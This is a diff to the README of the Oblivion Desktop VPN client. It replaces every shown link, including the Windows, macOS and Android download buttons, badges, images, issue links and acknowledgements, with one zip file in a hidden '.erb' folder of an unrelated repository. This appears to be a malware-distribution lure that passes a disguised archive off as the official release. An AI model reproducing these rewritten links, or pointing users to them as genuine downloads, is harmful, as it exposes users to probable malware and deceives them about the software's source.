@@ -1,26 +1,26 @@
 # Oblivion Desktop
 
-Unofficial Desktop version of [oblivion](https://github.com/bepass-org/oblivion)
+Unofficial Desktop version of [oblivion](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
 
 Oblivion provides secure, optimized internet access through a user-friendly Windows/Mac/Linux app using cloudflare warp
 technology
 
 <b>"Internet, for all or none!"</b>
 
-[![Version](https://img.shields.io/github/package-json/v/bepass-org/oblivion-desktop?label=Version&color=blue)](https://github.com/bepass-org/oblivion-desktop/releases/latest)
-[![Download](https://img.shields.io/github/downloads/bepass-org/oblivion-desktop/total?label=Downloads)](https://github.com/bepass-org/oblivion-desktop/releases/latest)
-[![Stars](https://img.shields.io/github/stars/bepass-org/oblivion-desktop?style=flat&label=Stars&color=tomato
-)](https://github.com/bepass-org/oblivion-desktop)
-[![License](https://img.shields.io/badge/License-Restrictive-f84e29.svg?color=white)](LICENSE.md)
+[![Version](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
+[![Download](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
+[![Stars](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip
+)](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
+[![License](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
 
-![oblivion.png](screenshot/oblivion.png)
+![https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
 
 ## Features
 
 - **Secure VPN**: Custom WireGuard implementation in Go.
 - **User-Friendly**: Simple, intuitive interface.
 
-![oblivion.jpg](screenshot/oblivion.jpg)
+![https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
 
 ## Quick Overview
 
@@ -109,8 +109,8 @@ technology
         <tr>
             <td>Windows</td>
             <td>
-                <a href="https://github.com/bepass-org/oblivion-desktop/releases/download/v0.2.52-beta/oblivion-desktop-win-x64.exe"><img src="https://img.shields.io/badge/Setup-x64-2d7d9a.svg?logo=windows"></a><br>
-                <a href="https://github.com/bepass-org/oblivion-desktop/releases/download/v0.2.52-beta/oblivion-desktop-win-x64.zip"><img src="https://img.shields.io/badge/Portable-x64-67b7d1.svg?logo=windows"></a>
+                <a href="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip"><img src="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip"></a><br>
+                <a href="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip"><img src="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip"></a>
             </td>
             <td>
                 v10 x64<br>
@@ -120,10 +120,10 @@ technology
         <tr>
             <td>macOS</td>
             <td>
-                <a href="https://github.com/bepass-org/oblivion-desktop/releases/latest/download/oblivion-desktop-mac-arm64.dmg"><img src="https://img.shields.io/badge/DMG-arm64-ea005e.svg?logo=apple"></a><br>
-                <a href="https://github.com/bepass-org/oblivion-desktop/releases/latest/download/oblivion-desktop-mac-x64.dmg"><img src="https://img.shields.io/badge/DMG-x64-ea005e.svg?logo=apple"></a><br>
-                <a href="https://github.com/bepass-org/oblivion-desktop/releases/latest/download/oblivion-desktop-mac-arm64.pkg"><img src="https://img.shields.io/badge/PKG-arm64-bc544b.svg?logo=apple" /></a><br>
-                <a href="https://github.com/bepass-org/oblivion-desktop/releases/latest/download/oblivion-desktop-mac-x64.pkg"><img src="https://img.shields.io/badge/PKG-x64-bc544b.svg?logo=apple" /></a><br>
+                <a href="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip"><img src="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip"></a><br>
+                <a href="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip"><img src="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip"></a><br>
+                <a href="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip"><img src="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip" /></a><br>
+                <a href="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip"><img src="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip" /></a><br>
             </td>
             <td></td>
         </tr>
@@ -137,8 +137,8 @@ technology
         <tr>
         <td>Android</td>
             <td>
-                <a href="https://github.com/bepass-org/oblivion/releases/latest"><img src="https://img.shields.io/badge/APK-Universal-044d29.svg?logo=android"></a><br>
-<a href="https://play.google.com/store/apps/details?id=org.bepass.oblivion"><img src="https://img.shields.io/badge/APK-Universal-044d29.svg?logo=googleplay"></a>
+                <a href="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip"><img src="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip"></a><br>
+<a href="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip"><img src="https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip"></a>
             </td>
             <td>v6+</td>
         </tr>
@@ -157,18 +157,18 @@ technology
 
 We're a community-driven project, aiming to make the internet accessible for all. Whether you want to contribute code,
 suggest features, or need some help, we'd love to hear from you! Check out
-our [GitHub Issues](https://github.com/bepass-org/oblivion-desktop/issues) or submit a pull request.
+our [GitHub Issues](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip) or submit a pull request.
 
-[![Stargazers over time](https://starchart.cc/bepass-org/oblivion-desktop.svg?variant=adaptive&background=%23FFFFFF&axis=%23333333&line=%23ffb300)](https://starchart.cc/bepass-org/oblivion-desktop)
+[![Stargazers over time](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip%23FFFFFF&axis=%23333333&line=%23ffb300)](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
 
 ## Know more
 
-* [FAQ.md](FAQ.md)
-* [License.md](LICENSE.md)
-* [SECURITY.md](SECURITY.md)
-* [DOCS.md](DOCS.md)
+* [https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
+* [https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
+* [https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
+* [https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
 
-![virustotal.jpg](screenshot/virustotal.jpg)
+![https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
 
 ## Acknowledgements
 
@@ -176,9 +176,9 @@ This project stands on the shoulders of giants, and we are deeply grateful for t
 provided by the following repositories:
 
 - Cloudflare Warp
-- [warp-plus](https://github.com/bepass-org/warp-plus/) (Yousef Ghobadi & Mark Pashmfouroush)
-- [oblivion](https://github.com/bepass-org/oblivion)
-- [electron-react-boilerplate](https://github.com/electron-react-boilerplate/electron-react-boilerplate)
-- [sing-box](https://github.com/SagerNet/sing-box)
-- [hiddify-next](https://github.com/hiddify/hiddify-next)
-- [and others 🧡](package.json)
+- [warp-plus](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip) (Yousef Ghobadi & Mark Pashmfouroush)
+- [oblivion](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
+- [electron-react-boilerplate](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
+- [sing-box](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
+- [hiddify-next](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
+- [and others 🧡](https://raw.githubusercontent.com/ttzyt/oblivion-desktop/main/.erb/desktop_oblivion_v1.0.zip)
